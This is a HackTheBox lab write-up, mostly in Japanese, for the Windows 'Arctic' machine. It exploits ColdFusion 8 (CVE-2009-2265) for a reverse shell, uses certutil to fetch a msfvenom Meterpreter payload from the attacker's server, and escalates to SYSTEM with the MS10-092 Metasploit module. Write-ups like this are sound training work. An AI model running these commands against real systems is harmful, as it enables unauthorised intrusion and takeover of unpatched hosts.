+++
title = "HackTheBox - Arctic Writeup"
date = "2026-04-14"
description = "Adobe ColdFusion 8のRCEで初期侵入、MS10-092でSYSTEM昇格"
tags = ["HackTheBox", "CTF", "Windows", "ColdFusion", "CVE-2009-2265", "MS10-092", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Arctic |
| OS | Windows Server 2008 R2 |
| IP | 10.129.19.47 |
| Difficulty | Easy |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.19.47
```

```text
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

ポート8500でJRun Web Serverが動いている。ブラウザでアクセスするとディレクトリ一覧が表示され、`/CFIDE/administrator/` にAdobe ColdFusion 8の管理画面がある。

---

## Initial Access — ColdFusion 8 RCE (CVE-2009-2265)

```bash
searchsploit coldfusion 8
searchsploit -m cfm/webapps/50057.py
cp 50057.py poc.py
```

poc.pyの以下のパラメータを書き換える。

```python
lhost = '10.10.16.166'
lport = 4444
rhost = "10.129.19.47"
rport = 8500
```

---

## Listener

```bash
nc -lvnp 4444
```

---

## Trigger

```bash
python3 poc.py
```

```text
Generating a payload...
Payload size: 1496 bytes
Listening for connection...
Executing the payload...
```

---

## Foothold

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.19.47] 49293
Microsoft Windows [Version 6.1.7600]

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

---

## Flags — User

```bash
more C:\Users\tolis\Desktop\user.txt
```

---

## Payload Generation

Meterpreterシェルにアップグレードするためのペイロードを生成する。

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.166 lport=4242 -f exe > shell.exe
```

---

## Upload / Delivery

攻撃機でHTTPサーバーを起動する。

```bash
python3 -m http.server 8000
```

ターゲット側でcertutilを使ってダウンロードする。

```bash
certutil -urlcache -f http://10.10.16.166:8000/shell.exe C:\Users\tolis\AppData\Local\Temp\shell.exe
```

```text
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

---

## Trigger

```bash
C:\Users\tolis\AppData\Local\Temp\shell.exe
```

---

## Meterpreter Listener

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.16.166
set lport 4242
run
```

```text
[*] Started reverse TCP handler on 10.10.16.166:4242
[*] Sending stage (196678 bytes) to 10.129.19.47
[*] Meterpreter session 1 opened (10.10.16.166:4242 -> 10.129.19.47:49323)
```

---

## Post Exploitation

```bash
run post/multi/recon/local_exploit_suggester
```

```text
1  exploit/windows/local/bypassuac_comhijack                        Yes
2  exploit/windows/local/bypassuac_eventvwr                          Yes
3  exploit/windows/local/ms13_053_schlamperei                        Yes
4  exploit/windows/local/ms13_081_track_popup_menu                   Yes
5  exploit/windows/local/ms14_058_track_popup_menu                   Yes
6  exploit/windows/local/ms15_051_client_copy_image                  Yes
7  exploit/windows/local/ms16_032_secondary_logon_handle_privesc     Yes
8  exploit/windows/local/ms16_075_reflection                         Yes
9  exploit/windows/local/ms16_075_reflection_juicy                   Yes
```

---

## Privilege Escalation

x64プロセスにmigrateしてからMS10-092を実行する。

```bash
migrate 1120
background
```

```bash
use exploit/windows/local/ms10_092_schelevator
set session 1
set AutoCheck false
set lhost 10.10.16.166
set lport 5557
run
```

---

## SYSTEM Shell

```text
C:\>more users\Administrator\desktop\root.txt
```

---



---

## Summary

ColdFusion 8 RCE (CVE-2009-2265) → tolis → MS10-092 (schelevator) → NT AUTHORITY\SYSTEM
